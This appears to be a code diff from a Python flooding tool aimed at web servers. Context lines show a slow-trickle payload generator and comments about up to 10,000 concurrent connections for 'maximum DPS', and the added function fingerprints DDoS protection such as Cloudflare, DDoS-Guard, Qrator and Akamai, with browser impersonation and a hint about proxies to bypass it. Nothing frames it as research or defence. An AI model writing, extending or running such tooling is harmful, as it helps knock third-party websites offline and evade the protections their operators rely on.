@@ -645,7 +645,26 @@ async def slow_payload_generator():
 		yield b"A"
 		await asyncio.sleep(random.uniform(5, 10))
 
+async def check_waf(target_url):
+	try:
+		async with AsyncSession(verify=False, impersonate="chrome116") as session:
+			resp = await session.get(target_url, timeout=5.0)
+			server = resp.headers.get("Server", "Unknown")
+			logging.info(f"[WAF DETECT] Target Server/Protection: {server}")
+			server_lower = server.lower()
+			if "cloudflare" in server_lower:
+				logging.warning("[WAF DETECT] Cloudflare detected! You might need premium proxies to bypass completely.")
+			elif "ddos-guard" in server_lower:
+				logging.warning("[WAF DETECT] DDoS-Guard detected!")
+			elif "qrator" in server_lower:
+				logging.warning("[WAF DETECT] Qrator detected!")
+			elif "akamai" in server_lower:
+				logging.warning("[WAF DETECT] Akamai detected!")
+	except Exception as e:
+		logging.debug(f"[WAF DETECT] Could not determine WAF: {e}")
+
 async def main_loop():
+	await check_waf(url)
 	tasks = []
 	# Limit active connections so we don't blow up the local OS networking stack
 	# Allow massive concurrency for maximum DPS (up to 10000)
